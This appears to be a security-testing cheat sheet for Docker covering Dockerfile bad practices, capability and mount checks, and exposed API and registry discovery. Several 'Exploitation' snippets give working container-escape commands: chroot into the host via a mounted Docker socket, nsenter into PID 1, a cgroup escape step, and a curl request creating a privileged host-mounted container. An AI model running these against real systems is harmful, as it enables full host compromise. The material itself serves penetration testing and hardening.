# Docker Security Testing

## Dockerfile Analysis

### Security Checks

| Check | Bad Practice | Recommendation |
|-------|-------------|----------------|
| User | `USER root` or no USER directive | `USER nonroot:nonroot` |
| Base image | `FROM ubuntu:latest` | `FROM ubuntu:22.04` (pinned) or distroless |
| Secrets | `ENV API_KEY=secret` | Use build secrets or runtime injection |
| COPY | `COPY . /app` | Explicit file list, use `.dockerignore` |
| Capabilities | `--cap-add=ALL` | Drop ALL, add only needed |
| Ports | `EXPOSE 22` | Only expose application ports |

### Automated Analysis

```bash
# Hadolint - Dockerfile linter
docker run --rm -i hadolint/hadolint < Dockerfile

# Dockle - Container image linter
dockle <image:tag>
```

## Container Runtime Security

### Docker Socket Exposure

```bash
# Check if Docker socket is mounted in containers
docker inspect <container> | grep -i "docker.sock"

# Exploitation: Create privileged container from within
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

**Impact**: Full host compromise via container escape

### Privileged Container Escape

```bash
# Check if container is privileged
docker inspect <container> --format '{{.HostConfig.Privileged}}'

# Escape via nsenter (from privileged container)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Escape via cgroups (CVE-2022-0492 style)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
```

### Capability Analysis

```bash
# Check container capabilities
docker inspect <container> --format '{{.HostConfig.CapAdd}}'
docker inspect <container> --format '{{.HostConfig.CapDrop}}'

# From inside container
cat /proc/1/status | grep Cap
capsh --decode=<hex>
```

**Dangerous capabilities**: SYS_ADMIN, SYS_PTRACE, NET_ADMIN, DAC_READ_SEARCH

### Mount Analysis

```bash
# Check volume mounts
docker inspect <container> --format '{{json .Mounts}}'

# Dangerous mounts
# /var/run/docker.sock - Docker API access
# / - Full host filesystem
# /etc - Host configuration
# /proc/sysrq-trigger - Kernel commands
```

## Docker API Security

### Remote API Exposure

```bash
# Check for exposed Docker API (default: 2375/2376)
curl http://<host>:2375/version
curl http://<host>:2375/containers/json

# Exploitation: Create privileged container
curl -X POST http://<host>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
```

### Docker Registry

```bash
# Check for unauthenticated registry
curl http://<registry>:5000/v2/_catalog
curl http://<registry>:5000/v2/<image>/tags/list

# Pull and inspect image
docker pull <registry>:5000/<image>:<tag>
docker history <image>:<tag>
```

## Network Security

```bash
# Check container network mode
docker inspect <container> --format '{{.HostConfig.NetworkMode}}'

# Dangerous: host network mode (shares host's network stack)
# Check: docker run --network=host

# List Docker networks
docker network ls
docker network inspect <network>
```

## Secrets in Images

```bash
# Search image layers for secrets
docker save <image> -o image.tar
tar xf image.tar
# Search extracted layers for secrets, keys, credentials

# Using trivy for secret detection
trivy image --scanners secret <image:tag>
```

## Logging and Monitoring

```bash
# Check logging driver
docker inspect <container> --format '{{.HostConfig.LogConfig}}'

# Container resource limits
docker inspect <container> --format '{{.HostConfig.Memory}} {{.HostConfig.CpuShares}}'
```

**No resource limits** = potential DoS via resource exhaustion
